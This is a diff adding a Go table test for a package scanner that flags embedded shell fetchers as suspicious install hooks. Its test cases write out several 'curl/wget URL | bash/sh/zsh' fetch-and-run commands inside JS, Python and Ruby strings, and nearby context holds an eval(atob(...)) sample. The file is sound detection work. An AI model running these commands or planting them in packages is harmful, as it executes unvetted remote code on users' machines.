@@ -1,6 +1,7 @@
 package heuristics
 
 import (
+	"slices"
 	"strings"
 	"testing"
 
@@ -372,6 +373,63 @@ func TestDetectSourcePatterns_PythonObfuscation(t *testing.T) {
 }
 
 // Sanity: catches the pattern even in minified content (one long line).
+func TestDetectSourcePatterns_ShellFetcher(t *testing.T) {
+	cases := []struct {
+		name string
+		file string
+		body string
+		want bool
+	}{
+		{
+			name: "curl pipe bash JS string",
+			file: "index.js",
+			body: `exec("curl -fsSL https://raw.githubusercontent.com/JuliusBrussee/caveman/main/install.sh | bash")`,
+			want: true,
+		},
+		{
+			name: "wget pipe sh Python",
+			file: "setup.py",
+			body: `os.system("wget -qO- https://example.com/setup.sh | sh")`,
+			want: true,
+		},
+		{
+			name: "curl pipe zsh Ruby",
+			file: "lib/install.rb",
+			body: "`curl -fsSL https://install.example.com/go.sh | zsh`",
+			want: true,
+		},
+		{
+			name: "curl flags URL pipe bash multiline",
+			file: "scripts/run.js",
+			body: "const cmd = `curl --silent --location https://raw.githubusercontent.com/user/repo/HEAD/install.sh | bash`;",
+			want: true,
+		},
+		{
+			name: "benign curl without pipe",
+			file: "index.js",
+			body: `const r = await fetch(url); // curl -v https://api.example.com/health`,
+			want: false,
+		},
+		{
+			name: "non-source file skipped",
+			file: "README.md",
+			body: "curl -fsSL https://raw.githubusercontent.com/user/repo/main/install.sh | bash",
+			want: false,
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			caps := DetectSourcePatterns(usecase.PackageSource{
+				Files: map[string][]byte{tc.file: []byte(tc.body)},
+			})
+			got := slices.Contains(caps, domain.CapInstallHookSuspicious)
+			if got != tc.want {
+				t.Errorf("CapInstallHookSuspicious = %v, want %v (caps: %v)", got, tc.want, caps)
+			}
+		})
+	}
+}
+
 func TestDetectSourcePatterns_Minified(t *testing.T) {
 	js := strings.Repeat("var x=1;", 1000) + `eval(atob("YWJj"))` + strings.Repeat("var y=2;", 1000)
 	caps := DetectSourcePatterns(usecase.PackageSource{
